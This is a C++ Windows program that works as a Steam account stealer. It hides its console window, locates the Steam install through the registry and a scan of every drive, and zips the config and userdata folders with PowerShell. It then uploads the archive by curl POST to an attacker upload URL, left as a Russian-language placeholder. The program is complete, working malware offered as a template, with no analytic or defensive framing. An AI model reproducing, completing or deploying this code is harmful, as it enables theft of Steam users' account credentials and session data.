#include <windows.h>
#include <string>
#include <filesystem>
#include <chrono>
#include <ctime>
#include <sstream>
#include <iomanip>

namespace fs = std::filesystem;

static bool pathExists(const fs::path& p) {
    try { return fs::exists(p); }
    catch (...) { return false; }
}

static bool isDir(const fs::path& p) {
    try { return fs::is_directory(p); }
    catch (...) { return false; }
}

static std::string findSteamPath() {
    HKEY hKey;
    const char* regKeys[] = {
        "SOFTWARE\\WOW6432Node\\Valve\\Steam",
        "SOFTWARE\\Valve\\Steam"
    };
    for (const char* key : regKeys) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buf[MAX_PATH]{};
            DWORD sz = MAX_PATH;
            bool ok = (RegQueryValueExA(hKey, "InstallPath", nullptr, nullptr, (BYTE*)buf, &sz) == ERROR_SUCCESS);
            RegCloseKey(hKey);
            if (ok && buf[0] && pathExists(buf)) return buf;
        }
    }

    const char* common[] = {
        "C:\\Program Files (x86)\\Steam",
        "C:\\Program Files\\Steam",
        "D:\\Steam",
        "E:\\Steam",
        "F:\\Steam",
    };
    for (auto p : common)
        if (pathExists(p)) return p;

    DWORD drv = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (drv & (1 << i)) {
            std::string d(1, (char)('A' + i));
            d += ":\\Steam";
            if (pathExists(d)) return d;
        }
    }
    return "";
}

static std::string tempDir() {
    char buf[MAX_PATH]{};
    GetTempPathA(MAX_PATH, buf);
    std::string s(buf);
    while (!s.empty() && s.back() == '\\') s.pop_back();
    return s;
}

static std::string moscowTimestamp() {
    auto now = std::chrono::system_clock::now() + std::chrono::hours(3);
    std::time_t t = std::chrono::system_clock::to_time_t(now);
    struct tm ti{};
    gmtime_s(&ti, &t);
    std::ostringstream os;
    os << std::setfill('0')
       << std::setw(2) << ti.tm_hour << "-"
       << std::setw(2) << ti.tm_min << "_"
       << std::setw(2) << ti.tm_mday << "."
       << std::setw(2) << (ti.tm_mon + 1);
    return os.str();
}

int main() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    std::string steam = findSteamPath();
    if (steam.empty()) return 1;

    std::string cfg = steam + "\\config";
    std::string udata = steam + "\\userdata";
    bool hasCfg = isDir(cfg);
    bool hasUdata = isDir(udata);
    if (!hasCfg && !hasUdata) return 1;

    std::string tmp = tempDir();
    std::string ts = moscowTimestamp();
    std::string zipPath = tmp + "\\" + ts + ".zip";

    std::ostringstream ps;
    ps << "powershell -NoProfile -Command \"Compress-Archive -Path ";
    if (hasCfg) ps << "\\\"" << cfg << "\\\"";
    if (hasCfg && hasUdata) ps << ",";
    if (hasUdata) ps << "\\\"" << udata << "\\\"";
    ps << " -DestinationPath \\\"" << zipPath << "\\\" -Force\"";

    system(ps.str().c_str());

    for (int i = 0; i < 600 && !pathExists(zipPath); i++) Sleep(100);
    if (!pathExists(zipPath)) return 1;

    std::ostringstream curl;
    curl << "curl.exe -s -X POST -F \"file=@" << zipPath << "\" ВАША ССЫЛКА НА upload НА ВАШЕМ САЙТЕ(ЗАГРУЗЧИК ФАЙЛОВ НА СЕРВЕР)";

    system(curl.str().c_str());

    return 0;
}
